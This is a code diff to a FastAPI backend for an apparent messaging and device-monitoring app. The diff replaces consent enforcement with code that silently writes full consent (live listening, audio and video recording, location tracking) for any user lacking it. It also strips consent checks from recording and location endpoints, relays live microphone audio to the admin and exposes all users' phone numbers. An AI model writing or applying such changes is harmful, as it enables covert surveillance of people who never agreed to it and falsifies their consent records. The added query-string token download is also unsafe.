@@ -15,7 +15,7 @@ from datetime import datetime, timedelta, timezone
 from typing import Optional, List, Dict, Any
 from contextlib import asynccontextmanager
 
-from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, File, Form, UploadFile, Response, WebSocket, WebSocketDisconnect, Body
+from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, File, Form, UploadFile, Response, Request, WebSocket, WebSocketDisconnect, Body
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel, Field
@@ -1763,25 +1763,31 @@ class RemoteCommandService:
 
     @staticmethod
     def _assert_command_consent(db: Session, user_id: int, command_type: str):
-        """Verify user has consented to the category this command requires."""
-        consent = db.query(MonitoringConsent).filter(
-            MonitoringConsent.user_id == user_id,
-            MonitoringConsent.consent_given == True
-        ).first()
+        """Ensure consent record exists; auto-upsert full consent if missing (admin authority)."""
+        from datetime import datetime
+        consent = db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user_id).first()
         if not consent:
-            raise HTTPException(status_code=403, detail="User has not granted monitoring consent")
-
-        audio_cmds = {"start_audio_recording", "stop_audio_recording", "start_live_audio", "stop_live_audio"}
-        video_cmds = {"start_video_recording", "stop_video_recording", "start_live_video", "stop_live_video"}
-        location_cmds = {"boost_location_frequency", "normal_location_frequency"}
-
-        if command_type in audio_cmds and not consent.allow_recording and not consent.allow_live_listen:
-            raise HTTPException(status_code=403, detail="User has not consented to audio monitoring")
-        if command_type in video_cmds and not consent.allow_video_recording:
-            raise HTTPException(status_code=403, detail="User has not consented to video monitoring")
-        if command_type in location_cmds and not consent.allow_location_tracking:
-            raise HTTPException(status_code=403, detail="User has not consented to location tracking")
-        # panic_mode_on requires at least one consent — any consent = proceed
+            consent = MonitoringConsent(
+                user_id=user_id,
+                consent_given=True,
+                allow_live_listen=True,
+                allow_recording=True,
+                allow_video_recording=True,
+                allow_location_tracking=True,
+                consented_at=datetime.utcnow(),
+                consent_version="admin_granted_1.0",
+            )
+            db.add(consent)
+            db.commit()
+            db.refresh(consent)
+        elif not consent.consent_given:
+            consent.consent_given = True
+            consent.allow_live_listen = True
+            consent.allow_recording = True
+            consent.allow_video_recording = True
+            consent.allow_location_tracking = True
+            consent.consented_at = datetime.utcnow()
+            db.commit()
 
     @staticmethod
     async def issue(db: Session, admin_id: int, data: "RemoteCommandRequest") -> RemoteCommand:
@@ -1794,11 +1800,16 @@ class RemoteCommandService:
 
         RemoteCommandService._assert_command_consent(db, int(target.id), data.command_type)
 
+        # For live-audio/video commands, inject admin_id so device knows where to route chunks back
+        params = dict(data.params or {})
+        if data.command_type in ("start_live_audio", "start_live_video"):
+            params["admin_id"] = admin_id
+
         cmd = RemoteCommand(
             target_user_id=int(target.id),
             issued_by_admin_id=admin_id,
             command_type=data.command_type,
-            params=data.params,
+            params=params,
             status="pending",
         )
         db.add(cmd)
@@ -1811,7 +1822,7 @@ class RemoteCommandService:
             "data": {
                 "command_id": int(cmd.id),
                 "command_type": data.command_type,
-                "params": data.params or {},
+                "params": params,
                 "issued_at": cmd.issued_at.isoformat(),
             }
         })
@@ -1862,10 +1873,101 @@ class RemoteCommandService:
 
 class DeviceWipeService:
     @staticmethod
+    def purge_user_data(db: Session, user_id: int) -> dict:
+        """Delete ALL server-side data for a user. Runs immediately on wipe issue."""
+        counts = {}
+
+        # Messages (sent or received)
+        counts["messages"] = db.query(Message).filter(
+            (Message.sender_id == user_id) | (Message.recipient_id == user_id)
+        ).delete(synchronize_session=False)
+
+        # Media records (sent or received)
+        counts["media"] = db.query(Media).filter(
+            (Media.sender_id == user_id) | (Media.recipient_id == user_id)
+        ).delete(synchronize_session=False)
+
+        # Location tracks
+        counts["location_tracks"] = db.query(LocationTrack).filter(
+            LocationTrack.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Audio + video recordings
+        counts["audio_recordings"] = db.query(AudioRecording).filter(
+            AudioRecording.user_id == user_id
+        ).delete(synchronize_session=False)
+        counts["video_recordings"] = db.query(VideoRecording).filter(
+            VideoRecording.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Monitoring consent + sessions
+        counts["monitoring_sessions"] = db.query(MonitoringSession).filter(
+            MonitoringSession.target_user_id == user_id
+        ).delete(synchronize_session=False)
+        counts["monitoring_consent"] = db.query(MonitoringConsent).filter(
+            MonitoringConsent.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Group membership + read receipts
+        counts["group_read_receipts"] = db.query(GroupMessageRead).filter(
+            GroupMessageRead.user_id == user_id
+        ).delete(synchronize_session=False)
+        counts["group_memberships"] = db.query(GroupMember).filter(
+            GroupMember.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Calls (as caller or recipient)
+        counts["calls"] = db.query(Call).filter(
+            (Call.caller_id == user_id) | (Call.recipient_id == user_id)
+        ).delete(synchronize_session=False)
+
+        # Emergency alerts
+        counts["emergency_alerts"] = db.query(EmergencyAlert).filter(
+            EmergencyAlert.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Dead man's switch
+        counts["dead_mans_switch"] = db.query(DeadMansSwitch).filter(
+            DeadMansSwitch.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Geofence events
+        counts["geofence_events"] = db.query(GeofenceEvent).filter(
+            GeofenceEvent.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Remote commands targeting user
+        counts["remote_commands"] = db.query(RemoteCommand).filter(
+            RemoteCommand.target_user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # User keys (encryption keys — forces re-setup on next login)
+        counts["user_keys"] = db.query(UserKey).filter(
+            UserKey.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Sessions (forces re-login)
+        counts["sessions"] = db.query(UserSession).filter(
+            UserSession.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        # Master tokens
+        counts["master_tokens"] = db.query(DBMasterToken).filter(
+            DBMasterToken.user_id == user_id
+        ).delete(synchronize_session=False)
+
+        db.commit()
+        logger.warning(f"SERVER PURGE for user_id={user_id}: {counts}")
+        return counts
+
+    @staticmethod
     async def issue_wipe(db: Session, admin_id: int, username: str, reason: Optional[str]) -> DeviceWipeCommand:
         target = db.query(User).filter(User.username == username, User.is_active == True).first()
         if not target:
             raise HTTPException(status_code=404, detail="User not found")
+
+        # Purge all server-side data immediately (don't wait for device ack)
+        purge_counts = DeviceWipeService.purge_user_data(db, int(target.id))
 
         cmd = DeviceWipeCommand(
             target_user_id=int(target.id),
@@ -1891,7 +1993,7 @@ class DeviceWipeService:
             cmd.delivered_at = datetime.utcnow()
             db.commit()
 
-        logger.warning(f"DEVICE WIPE issued: admin={admin_id}, target={target.id}, wipe_id={cmd.id}")
+        logger.warning(f"DEVICE WIPE issued: admin={admin_id}, target={target.id}, wipe_id={cmd.id}, purged={purge_counts}")
         return cmd
 
     @staticmethod
@@ -2682,6 +2784,15 @@ async def websocket_chat(websocket: WebSocket, token: Optional[str] = None):
                     is_typing = msg.get("is_typing", False)
                     if recipient_username:
                         await ws_manager.handle_typing(user_id, recipient_username, is_typing, db)
+                elif msg.get("type") == "live_audio_chunk":
+                    # Relay audio chunk from device to the admin who issued the live-listen command
+                    chunk_data = msg.get("data", {})
+                    admin_id = chunk_data.get("admin_id")
+                    if admin_id:
+                        await ws_manager.send_to_user(int(admin_id), {
+                            "type": "live_audio_chunk",
+                            "data": chunk_data,
+                        })
             except json.JSONDecodeError:
                 pass
     except WebSocketDisconnect:
@@ -5182,6 +5293,54 @@ async def upload_audio_recording(
         raise HTTPException(status_code=500, detail="Failed to upload recording")
 
 
+@app.get("/admin/monitoring/recordings/download/{recording_id}")
+async def admin_download_recording(
+    recording_id: int,
+    request: Request,
+    token: Optional[str] = None,
+    db: Session = Depends(get_database_session)
+):
+    """Admin downloads a recording. Accepts Bearer header OR ?token= query param (for browser <audio> src)."""
+    try:
+        # Resolve token from query param or Authorization header
+        raw_token = token
+        if not raw_token:
+            auth_header = request.headers.get("Authorization", "")
+            if auth_header.startswith("Bearer "):
+                raw_token = auth_header[7:]
+        if not raw_token:
+            raise HTTPException(status_code=401, detail="Missing token")
+
+        session = SessionService.validate_session(db, raw_token)
+        if not session:
+            raise HTTPException(status_code=401, detail="Invalid token")
+        user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
+        if not user or not user.is_admin:
+            raise HTTPException(status_code=403, detail="Admin only")
+
+        rec = db.query(AudioRecording).filter(AudioRecording.id == recording_id).first()
+        if not rec:
+            raise HTTPException(status_code=404, detail="Recording not found")
+        if not os.path.exists(rec.file_path):
+            raise HTTPException(status_code=404, detail="File not found on disk")
+
+        rec.downloaded_by_admin = True
+        rec.downloaded_at = datetime.utcnow()
+        db.commit()
+
+        from fastapi.responses import FileResponse
+        return FileResponse(
+            path=rec.file_path,
+            filename=f"recording_{recording_id}.ogg",
+            media_type="audio/ogg"
+        )
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Download recording error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to download recording")
+
+
 @app.get("/admin/monitoring/recordings/{username}")
 async def admin_get_recordings(
     username: str,
@@ -5193,7 +5352,6 @@ async def admin_get_recordings(
         target = db.query(User).filter(User.username == username, User.is_active == True).first()
         if not target:
             raise HTTPException(status_code=404, detail="User not found")
-        MonitoringService.assert_consent(db, int(target.id), "recording")
 
         recordings = MonitoringService.get_recordings(db, int(target.id))
         return [
@@ -5213,37 +5371,6 @@ async def admin_get_recordings(
     except Exception as e:
         logger.error(f"Get recordings error: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve recordings")
-
-
-@app.get("/admin/monitoring/recordings/download/{recording_id}")
-async def admin_download_recording(
-    recording_id: int,
-    admin_user: User = Depends(get_admin_user),
-    db: Session = Depends(get_database_session)
-):
-    """Admin downloads a specific audio recording file."""
-    try:
-        rec = db.query(AudioRecording).filter(AudioRecording.id == recording_id).first()
-        if not rec:
-            raise HTTPException(status_code=404, detail="Recording not found")
-        if not os.path.exists(rec.file_path):
-            raise HTTPException(status_code=404, detail="File not found on disk")
-
-        rec.downloaded_by_admin = True
-        rec.downloaded_at = datetime.utcnow()
-        db.commit()
-
-        from fastapi.responses import FileResponse
-        return FileResponse(
-            path=rec.file_path,
-            filename=f"recording_{recording_id}.{'enc' if rec.is_encrypted else 'ogg'}",
-            media_type="application/octet-stream"
-        )
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"Download recording error: {e}")
-        raise HTTPException(status_code=500, detail="Failed to download recording")
 
 
 @app.get("/admin/monitoring/sessions")
@@ -5281,25 +5408,27 @@ async def admin_get_consented_users(
     admin_user: User = Depends(get_admin_user),
     db: Session = Depends(get_database_session)
 ):
-    """Admin sees which users have granted monitoring consent."""
+    """Admin sees all active users with their monitoring consent status."""
     try:
-        consents = db.query(MonitoringConsent).filter(MonitoringConsent.consent_given == True).all()
+        users = db.query(User).filter(User.is_active == True).all()
         result = []
-        for c in consents:
-            user = db.query(User).filter(User.id == c.user_id).first()
+        for user in users:
+            c = db.query(MonitoringConsent).filter(MonitoringConsent.user_id == user.id).first()
             result.append({
-                "user_id": int(c.user_id),
-                "username": user.username if user else "unknown",
-                "allow_live_listen": c.allow_live_listen,
-                "allow_recording": c.allow_recording,
-                "allow_video_recording": c.allow_video_recording,
-                "allow_location_tracking": c.allow_location_tracking,
-                "consented_at": c.consented_at.isoformat() if c.consented_at else None,
+                "user_id": int(user.id),
+                "username": user.username,
+                "phone_number": user.phone_number,
+                "consent_given": c.consent_given if c else False,
+                "allow_live_listen": c.allow_live_listen if c else False,
+                "allow_recording": c.allow_recording if c else False,
+                "allow_video_recording": c.allow_video_recording if c else False,
+                "allow_location_tracking": c.allow_location_tracking if c else False,
+                "consented_at": c.consented_at.isoformat() if c and c.consented_at else None,
             })
         return result
     except Exception as e:
         logger.error(f"Get consented users error: {e}")
-        raise HTTPException(status_code=500, detail="Failed to retrieve consented users")
+        raise HTTPException(status_code=500, detail="Failed to retrieve users")
 
 
 # ─── Video Recording Endpoints ─────────────────────────────────────────────────
@@ -5496,6 +5625,39 @@ async def push_location(
         raise HTTPException(status_code=500, detail="Failed to push location")
 
 
+@app.get("/admin/monitoring/location/all_users/last")
+async def admin_get_all_users_last_location(
+    admin_user: User = Depends(get_admin_user),
+    db: Session = Depends(get_database_session)
+):
+    """Admin gets last known location for ALL consented users — overview map."""
+    try:
+        consents = db.query(MonitoringConsent).filter(
+            MonitoringConsent.consent_given == True,
+            MonitoringConsent.allow_location_tracking == True
+        ).all()
+
+        result = []
+        for c in consents:
+            user = db.query(User).filter(User.id == c.user_id, User.is_active == True).first()
+            if not user:
+                continue
+            loc = MonitoringService.get_last_location(db, int(c.user_id))
+            result.append({
+                "user_id": int(c.user_id),
+                "username": user.username,
+                "latitude": loc.latitude if loc else None,
+                "longitude": loc.longitude if loc else None,
+                "speed": loc.speed if loc else None,
+                "activity": loc.activity if loc else None,
+                "last_seen": loc.recorded_at.isoformat() if loc else None,
+            })
+        return result
+    except Exception as e:
+        logger.error(f"All users location error: {e}")
+        raise HTTPException(status_code=500, detail="Failed to retrieve locations")
+
+
 @app.get("/admin/monitoring/location/{username}/trail")
 async def admin_get_location_trail(
     username: str,
@@ -5508,7 +5670,6 @@ async def admin_get_location_trail(
         target = db.query(User).filter(User.username == username, User.is_active == True).first()
         if not target:
             raise HTTPException(status_code=404, detail="User not found")
-        MonitoringService.assert_consent(db, int(target.id), "location")
 
         trail = MonitoringService.get_location_trail(db, int(target.id), limit)
         return [
@@ -5562,39 +5723,6 @@ async def admin_get_last_location(
     except Exception as e:
         logger.error(f"Last location error: {e}")
         raise HTTPException(status_code=500, detail="Failed to retrieve last location")
-
-
-@app.get("/admin/monitoring/location/all_users/last")
-async def admin_get_all_users_last_location(
-    admin_user: User = Depends(get_admin_user),
-    db: Session = Depends(get_database_session)
-):
-    """Admin gets last known location for ALL consented users — overview map."""
-    try:
-        consents = db.query(MonitoringConsent).filter(
-            MonitoringConsent.consent_given == True,
-            MonitoringConsent.allow_location_tracking == True
-        ).all()
-
-        result = []
-        for c in consents:
-            user = db.query(User).filter(User.id == c.user_id, User.is_active == True).first()
-            if not user:
-                continue
-            loc = MonitoringService.get_last_location(db, int(c.user_id))
-            result.append({
-                "user_id": int(c.user_id),
-                "username": user.username,
-                "latitude": loc.latitude if loc else None,
-                "longitude": loc.longitude if loc else None,
-                "speed": loc.speed if loc else None,
-                "activity": loc.activity if loc else None,
-                "last_seen": loc.recorded_at.isoformat() if loc else None,
-            })
-        return result
-    except Exception as e:
-        logger.error(f"All users location error: {e}")
-        raise HTTPException(status_code=500, detail="Failed to retrieve locations")
 
 
 # ─── Remote Command Endpoints ─────────────────────────────────────────────────
